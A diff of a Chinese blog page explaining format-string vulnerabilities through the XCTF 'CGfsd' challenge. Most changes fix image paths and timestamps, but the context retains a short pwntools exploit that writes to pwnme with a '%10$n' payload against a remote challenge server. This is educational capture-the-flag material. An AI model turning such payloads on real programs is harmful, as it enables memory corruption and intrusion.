@@ -27,18 +27,18 @@
 <meta property="og:site_name" content="un0o7&#39;s blog">
 <meta property="og:description" content="PWN中的格式化字符漏洞，从实践出发。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://un0o7.github.io/2021/11/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png">
-<meta property="og:image" content="http://un0o7.github.io/2021/11/images/xctf-CGfsd/2348945-20210924214649609-1405132903.png">
-<meta property="og:image" content="http://un0o7.github.io/2021/11/images/xctf-CGfsd/2348945-20210924220054329-1040800902.png">
-<meta property="og:image" content="http://un0o7.github.io/2021/11/images/xctf-CGfsd/2348945-20210924220519202-68676763.png">
-<meta property="og:image" content="http://un0o7.github.io/2021/11/images/xctf-CGfsd/2348945-20210924214603821-1020535736.png">
-<meta property="og:image" content="http://un0o7.github.io/2021/11/images/xctf-CGfsd/2348945-20210924214806885-2131536334.png">
+<meta property="og:image" content="http://un0o7.github.io/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png">
+<meta property="og:image" content="http://un0o7.github.io/images/xctf-CGfsd/2348945-20210924214649609-1405132903.png">
+<meta property="og:image" content="http://un0o7.github.io/images/xctf-CGfsd/2348945-20210924220054329-1040800902.png">
+<meta property="og:image" content="http://un0o7.github.io/images/xctf-CGfsd/2348945-20210924220519202-68676763.png">
+<meta property="og:image" content="http://un0o7.github.io/images/xctf-CGfsd/2348945-20210924214603821-1020535736.png">
+<meta property="og:image" content="http://un0o7.github.io/images/xctf-CGfsd/2348945-20210924214806885-2131536334.png">
 <meta property="article:published_time" content="2021-11-12T15:03:57.000Z">
-<meta property="article:modified_time" content="2021-11-12T15:10:03.826Z">
+<meta property="article:modified_time" content="2021-11-13T01:08:52.434Z">
 <meta property="article:author" content="un0o7">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://un0o7.github.io/2021/11/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png">
+<meta name="twitter:image" content="http://un0o7.github.io/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png">
 
 <link rel="canonical" href="http://un0o7.github.io/2021/11/12/xctf-CGfsd.html">
 
@@ -232,10 +232,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-11-12 23:03:57 / 修改时间：23:10:03" itemprop="dateCreated datePublished" datetime="2021-11-12T23:03:57+08:00">2021-11-12</time>
+              <time title="创建时间：2021-11-12 23:03:57" itemprop="dateCreated datePublished" datetime="2021-11-12T23:03:57+08:00">2021-11-12</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-13 09:08:52" itemprop="dateModified" datetime="2021-11-13T09:08:52+08:00">2021-11-13</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -305,28 +311,26 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(s);</span><br></pre></td></tr></table></figure>
 <h3 id="实例">实例</h3>
 <p>写一个小的C文件看看。</p>
-<figure>
-<img src="../images/xctf-CGfsd/2348945-20210924214658533-1665723789.png" alt="image-20210924214653390" /><figcaption aria-hidden="true">image-20210924214653390</figcaption>
-</figure>
+<p><img src="/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png" /></p>
 <p>输入AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x,可以发现从栈顶开始依次输出。可以看到地址61FE3C的位置存储着s字符串。匹配的第7个单元是s的实际存储位置。</p>
 <p><strong>主要是中间调用了printf函数导致很难具体分析栈空间，所以需要使用这种方法找到偏移位置。</strong></p>
 <figure>
-<img src="../images/xctf-CGfsd/2348945-20210924214649609-1405132903.png" alt="image-20210924214644435" /><figcaption aria-hidden="true">image-20210924214644435</figcaption>
+<img src="/images/xctf-CGfsd/2348945-20210924214649609-1405132903.png" alt="image-20210924214644435" /><figcaption aria-hidden="true">image-20210924214644435</figcaption>
 </figure>
 <figure>
-<img src="../images/xctf-CGfsd/2348945-20210924220054329-1040800902.png" alt="image-20210924220048916" /><figcaption aria-hidden="true">image-20210924220048916</figcaption>
+<img src="/images/xctf-CGfsd/2348945-20210924220054329-1040800902.png" alt="image-20210924220048916" /><figcaption aria-hidden="true">image-20210924220048916</figcaption>
 </figure>
 <h2 id="xtf_cgfsd">XTF_CGFSD</h2>
 <figure>
-<img src="../images/xctf-CGfsd/2348945-20210924220519202-68676763.png" alt="image-20210924220513883" /><figcaption aria-hidden="true">image-20210924220513883</figcaption>
+<img src="/images/xctf-CGfsd/2348945-20210924220519202-68676763.png" alt="image-20210924220513883" /><figcaption aria-hidden="true">image-20210924220513883</figcaption>
 </figure>
 <p><strong>目标：</strong>将pwnme的地址放到字符串s中，并且使用%(offset)$n将输出的字符串长度8放到那个地址中。将那个地址作为printf传入的第offset个参数。</p>
 <figure>
-<img src="../images/xctf-CGfsd/2348945-20210924214603821-1020535736.png" alt="image-20210924214557978" /><figcaption aria-hidden="true">image-20210924214557978</figcaption>
+<img src="/images/xctf-CGfsd/2348945-20210924214603821-1020535736.png" alt="image-20210924214557978" /><figcaption aria-hidden="true">image-20210924214557978</figcaption>
 </figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">55024</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please tell me your name:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;sdsds&quot;</span>)</span><br><span class="line">p=<span class="number">0x804A068</span></span><br><span class="line">payload=p32(p)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%10$n&quot;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;leave your message please:&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <figure>
-<img src="../images/xctf-CGfsd/2348945-20210924214806885-2131536334.png" alt="image-20210924214801629" /><figcaption aria-hidden="true">image-20210924214801629</figcaption>
+<img src="/images/xctf-CGfsd/2348945-20210924214806885-2131536334.png" alt="image-20210924214801629" /><figcaption aria-hidden="true">image-20210924214801629</figcaption>
 </figure>
 
     </div>
